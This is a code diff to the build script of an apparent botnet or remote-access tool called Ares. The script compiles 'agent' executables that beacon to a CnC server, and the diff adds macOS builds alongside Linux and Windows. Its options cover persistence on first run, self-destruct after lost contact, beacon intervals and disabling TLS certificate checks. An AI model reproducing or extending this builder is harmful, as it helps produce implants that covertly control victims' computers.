@@ -53,6 +53,8 @@ def build_agent(output, server_url, hello_interval, idle_time,
             output += ".exe"
     elif platform == "darwin":
         os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
+        output += ".app"
+        agent_file += ".app"
     os.chdir(cwd)
     os.rename(agent_file, output)
     shutil.rmtree(working_dir)
@@ -62,12 +64,12 @@ def build_agent(output, server_url, hello_interval, idle_time,
 def main():
     from argparse import ArgumentParser
     parser = ArgumentParser(description="Builds an Ares agent.")
-    parser.add_argument('--server', required=True, help="Address of the CnC server (e.g http://localhost:8080).")
-    parser.add_argument('-o', '--output', required=True, help="Output file name.")
+    parser.add_argument('-s','--server', required=True, help="Address of the CnC server (e.g http://localhost:5000).")
+    parser.add_argument('-o', '--output',default="agent", help="Output file name.")
     parser.add_argument('--hello-interval', type=int, default=60, help="Delay (in seconds) between each request to the CnC.")
     parser.add_argument('--idle-time', type=int, default=60, help="Inactivity time (in seconds) after which to go idle. In idle mode, the agent pulls commands less often (every <hello_interval> seconds).")
     parser.add_argument('--max-failed-connections', type=int, default=0, help="The agent will self destruct if no contact with the CnC can be made <max_failed_connections> times in a row.")
-    parser.add_argument('-p', '--persistent', action='store_true', help="Automatically install the agent on first run.")
+    parser.add_argument('-P', '--persistent', required=False, help="Automatically install the agent on first run.")
     parser.add_argument('--no-check-certificate', action='store_true', help="Disable server TLS certificate verification.")
     parser.add_argument('-p', '--platform', required=True, help="Platform (linux/windows/darwin)")
     parser.add_argument('-a', '--arch', default="32", help="32 or 64 (wine only)")
@@ -75,7 +77,7 @@ def main():
     args = parser.parse_args()
 
     args.platform = args.platform.lower()
-    if args.platform not in ['linux', 'windows']:
+    if args.platform not in ['linux', 'windows', 'darwin']:
         print("[!] Invalid plarform, should be windows or linux")
         exit(1)
 
